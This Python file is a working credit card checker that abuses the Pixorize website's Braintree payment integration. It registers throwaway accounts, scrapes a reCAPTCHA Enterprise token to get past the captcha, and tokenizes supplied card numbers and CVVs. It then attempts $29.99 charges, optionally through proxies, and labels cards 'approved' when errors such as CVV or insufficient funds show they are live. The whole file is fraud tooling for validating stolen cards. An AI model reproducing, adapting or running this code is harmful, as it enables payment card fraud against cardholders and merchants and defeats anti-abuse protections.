import re
import json
import random
import base64
import httpx
from typing import Optional
from urllib.parse import urlparse, parse_qs


def recaptcha_bypass():
    """Bypass reCAPTCHA for Pixorize"""
    anchor_url = "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LdSSo8pAAAAAN30jd519vZuNrcsbd8jvCBvkxSD&co=aHR0cHM6Ly9waXhvcml6ZS5jb206NDQz&hl=en&v=_mscDd1KHr60EWWbt2I_ULP0&size=invisible&anchor-ms=20000&execute-ms=15000&cb=9rxqj565e126"
    reload_url = "https://www.google.com/recaptcha/enterprise/reload?k=6LdSSo8pAAAAAN30jd519vZuNrcsbd8jvCBvkxSD"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
    }

    try:
        parsed_url = urlparse(anchor_url)
        params = parse_qs(parsed_url.query)

        response = httpx.get(anchor_url, headers=headers, timeout=30)
        token_match = re.search(r'value="([^"]+)"', response.text)
        if not token_match:
            return None
        token = token_match.group(1)

        data = {
            'v': params['v'][0],
            'reason': 'q',
            'c': token,
            'k': params['k'][0],
            'co': params['co'][0],
            'hl': 'tr',
            'size': 'invisible'
        }

        headers.update({
            "Referer": str(response.url),
            "Content-Type": "application/x-www-form-urlencoded"
        })

        response = httpx.post(reload_url, headers=headers, data=data, timeout=30)
        captcha_match = re.search(r'\["rresp","([^"]+)"', response.text)
        if captcha_match:
            return captcha_match.group(1)
        return None
    except Exception as e:
        print(f"Captcha bypass error: {e}")
        return None


def generate_random_email():
    """Generate random email"""
    chars = "1234567890qawsedzrtzfgxyuchjbiokblpn"
    em = (random.choice(chars) * 2 + random.choice(chars) * 2 +
          random.choice(chars) * 2 + random.choice(chars) + random.choice(chars))
    return f"{em}@gmail.com"


async def check_braintree(card: str, exp: str, exy: str, cvc: str, proxy: Optional[str] = None) -> dict:
    """
    Check credit card using Braintree via Pixorize

    Args:
        card: Card number
        exp: Expiry month
        exy: Expiry year (last 2 digits)
        cvc: CVV
        proxy: Optional proxy string

    Returns:
        dict with status and message
    """
    try:
        # Normalize year format
        if len(exy) == 4:
            exy = exy[2:]

        # Create session
        session = httpx.AsyncClient(
            follow_redirects=True,
            timeout=60.0,
            proxies=proxy if proxy else None
        )

        # Generate random email
        email = generate_random_email()

        # Step 1: Register user
        url = "https://apitwo.pixorize.com/users/register-simple"
        payload = {
            "email": email,
            "password": "jdjrj@#818",
            "learner_classification": 1
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            'Content-Type': "application/json",
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-mobile': "?1",
            'Origin': "https://pixorize.com",
            'Sec-Fetch-Site': "same-site",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://pixorize.com/",
            'Accept-Language': "en-US,en;q=0.9,ar;q=0.8",
        }

        response = await session.post(url, json=payload, headers=headers)
        if response.status_code != 200 and response.status_code != 201:
            await session.aclose()
            return {
                "status": "error",
                "message": "REGISTRATION_FAILED",
                "raw_response": response.text
            }

        # Step 2: Get Braintree token
        url = "https://apitwo.pixorize.com/braintree/token"
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': '"Android"',
            'Origin': "https://pixorize.com",
            'Sec-Fetch-Site': "same-site",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://pixorize.com/",
            'Accept-Language': "en-US,en;q=0.9,ar;q=0.8",
        }

        response = await session.get(url, headers=headers)
        if response.status_code != 200:
            await session.aclose()
            return {
                "status": "error",
                "message": "TOKEN_FETCH_FAILED",
                "raw_response": response.text
            }

        # Extract authorization fingerprint
        au = response.json()['payload']['clientToken']
        base4 = str(base64.b64decode(au))
        auth = base4.split('"authorizationFingerprint":')[1].split('"')[1]

        # Step 3: Tokenize credit card
        url = "https://payments.braintree-api.com/graphql"
        payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "dropin2",
                "sessionId": "90ec9e6b-9389-45c9-9542-ba6271ad49c6"
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": card,
                        "expirationMonth": exp,
                        "expirationYear": f"20{exy}",
                        "cvv": cvc,
                        "billingAddress": {
                            "postalCode": "10090"
                        }
                    },
                    "options": {
                        "validate": False
                    }
                }
            },
            "operationName": "TokenizeCreditCard"
        }

        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            'Content-Type': "application/json",
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': "?1",
            'authorization': f"Bearer {auth}",
            'braintree-version': "2018-05-10",
            'sec-ch-ua-platform': '"Android"',
            'origin': "https://assets.braintreegateway.com",
            'sec-fetch-site': "cross-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://assets.braintreegateway.com/",
            'accept-language': "en-US,en;q=0.9,ar;q=0.8"
        }

        response = await httpx.AsyncClient().post(url, json=payload, headers=headers)
        response_data = response.json()

        # Check for tokenization errors
        if "errors" in response_data:
            await session.aclose()
            error_msg = response_data["errors"][0].get("message", "TOKENIZATION_FAILED")
            return {
                "status": "declined",
                "message": error_msg,
                "raw_response": str(response_data)
            }

        if "data" not in response_data or not response_data["data"].get("tokenizeCreditCard"):
            await session.aclose()
            return {
                "status": "declined",
                "message": "CARD_INVALID",
                "raw_response": str(response_data)
            }

        token = response_data["data"]["tokenizeCreditCard"]["token"]

        # Step 4: Bypass captcha
        captcha_token = recaptcha_bypass()
        if not captcha_token:
            await session.aclose()
            return {
                "status": "error",
                "message": "CAPTCHA_BYPASS_FAILED",
                "raw_response": "Could not bypass captcha"
            }

        # Step 5: Make payment
        url = "https://apitwo.pixorize.com/braintree/pay"
        payload = {
            "subscriptionTypeId": 26,
            "nonce": token,
            "deviceData": '{"device_session_id":"1828806e70140be76f80b47aa269ef20","fraud_merchant_id":null,"correlation_id":"8adec9342087be4c33374c6ab459cb56"}',
            "promoCode": None,
            "captchaToken": captcha_token
        }

        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            'Content-Type': "application/json",
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-mobile': "?1",
            'Origin': "https://pixorize.com",
            'Sec-Fetch-Site': "same-site",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://pixorize.com/",
            'Accept-Language': "en-US,en;q=0.9,ar;q=0.8",
        }

        response = await session.post(url, json=payload, headers=headers)
        await session.aclose()

        # Parse response
        result = parse_payment_response(response.text, response.status_code)
        return result

    except Exception as e:
        return {
            "status": "error",
            "message": f"EXCEPTION: {str(e)}",
            "raw_response": str(e)
        }


def parse_payment_response(response_text: str, status_code: int) -> dict:
    """Parse the payment response"""
    try:
        response_data = json.loads(response_text)

        # Check for successful charge
        if status_code == 200 or status_code == 201:
            if "subscription" in response_data or "success" in response_data:
                return {
                    "status": "approved",
                    "message": "CHARGED $29.99 ✅",
                    "raw_response": response_text
                }

        # Check for common error messages
        error_message = response_data.get("message", "")
        error_msg = response_data.get("error", "")

        if error_message or error_msg:
            msg = error_message or error_msg

            # Approved responses (CVV/AVS errors, insufficient funds, etc.)
            if any(keyword in msg.upper() for keyword in [
                "INSUFFICIENT", "CVV", "CVC", "INCORRECT_CVC", "INVALID_CVC",
                "AVS", "ZIP", "POSTAL", "ADDRESS", "3DS", "AUTHENTICATE"
            ]):
                return {
                    "status": "approved",
                    "message": msg,
                    "raw_response": response_text
                }

            # Declined responses
            elif any(keyword in msg.upper() for keyword in [
                "DECLINED", "CARD_DECLINED", "FRAUD", "STOLEN", "LOST",
                "INVALID_NUMBER", "INCORRECT_NUMBER", "EXPIRED"
            ]):
                return {
                    "status": "declined",
                    "message": msg,
                    "raw_response": response_text
                }

            # Other errors
            else:
                return {
                    "status": "error",
                    "message": msg,
                    "raw_response": response_text
                }

        # Default declined
        return {
            "status": "declined",
            "message": "CARD_DECLINED",
            "raw_response": response_text
        }

    except json.JSONDecodeError:
        # If not JSON, check for common patterns
        if any(keyword in response_text.upper() for keyword in ["APPROVED", "SUCCESS", "CHARGED"]):
            return {
                "status": "approved",
                "message": "APPROVED",
                "raw_response": response_text
            }
        else:
            return {
                "status": "declined",
                "message": "CARD_DECLINED",
                "raw_response": response_text
            }
